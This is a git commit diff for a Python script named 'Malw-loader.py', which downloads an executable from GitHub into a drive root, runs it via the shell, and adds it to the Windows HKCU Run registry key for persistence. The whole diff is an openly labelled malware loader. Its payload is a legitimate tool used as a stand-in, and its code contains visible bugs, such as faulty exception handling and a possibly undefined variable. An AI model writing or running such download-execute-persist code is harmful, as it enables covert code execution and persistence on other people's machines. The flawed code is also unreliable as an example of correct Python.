2e38574f3b46bd5453828d364f91d2a6f8b69972
Cyber_Warrior <65919684+Syed-Sadam@users.noreply.github.com>
2020-05-26 01:33:40 -0700

    Update Malw-loader.py

--- Malw-loader.py
+++ Malw-loader.py
@@ -1,34 +1,55 @@
 import subprocess
 import wget
 import time
+import winreg as ws
+import os
 
-#Author: Syed Sadam Hussain Shah
+#Author:Syed Sadam Hussain Shah
 
 try:
-    wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe', r'C:\\')
+    location = r'C:\\'
+    wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe',location)
+    if True:
+        file_loc = location
     time.sleep(5)
     subprocess.call(["C:\\rufus-3.9p.exe"], shell=True)
-except PermissionError:
+except NotADirectoryError and FileNotFoundError and PermissionError:
     pass
 
     try:
-        wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe', r'D:\\')
+        location = r'D:\\'
+        wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe', location)
+        if True:
+            file_loc = location
         time.sleep(5)
         subprocess.call(["D:\\rufus-3.9p.exe"], shell=True)
     except NotADirectoryError and FileNotFoundError and PermissionError:
         pass
 
         try:
-            wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe', r'E:\\')
+            location = r'E:\\'
+            wget.download('https://github.com/pbatard/rufus/releases/download/v3.9/rufus-3.9p.exe',location)
+            if True:
+                file_loc = location
             time.sleep(5)
             subprocess.call(["E:\\rufus-3.9p.exe"], shell=True)
         except NotADirectoryError and FileNotFoundError and PermissionError:
             pass
 
+def startup ():
+    try:
+        file_path = os.path.dirname(os.path.realpath(file_loc))
+        file_name ="rufus-3.9p.exe"
+        address1=os.path.join(file_path, file_name)
+        HKEY = ws.HKEY_CURRENT_USER
+        key ="Software\Microsoft\Windows\CurrentVersion\Run"
+        open = ws.OpenKey(HKEY,key,0,ws.KEY_ALL_ACCESS)
+        ws.SetValueEx(open,"any_name",0,ws.REG_SZ,address1)
+        ws.CloseKey(open)
+    except:
+        pass
 
-
-
-
-
+if __name__ == "__main__":
+    startup()
 
 
